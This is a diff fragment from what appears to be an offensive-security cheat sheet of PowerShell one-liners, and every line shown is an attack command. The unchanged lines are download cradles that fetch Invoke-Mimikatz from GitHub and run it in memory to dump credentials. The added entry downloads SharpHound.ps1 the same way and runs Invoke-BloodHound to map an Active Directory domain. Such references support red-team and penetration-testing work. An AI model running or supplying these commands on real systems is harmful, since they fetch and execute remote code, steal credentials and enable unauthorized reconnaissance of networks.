@@ -85,3 +85,9 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 
 
+*Run Bloodhound from Memory using Download Cradle
+
+powershell -Command "Write-Host 'Remote download of SharpHound.ps1 into memory, followed by execution of the script' -ForegroundColor Cyan; IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5"
+
+
+
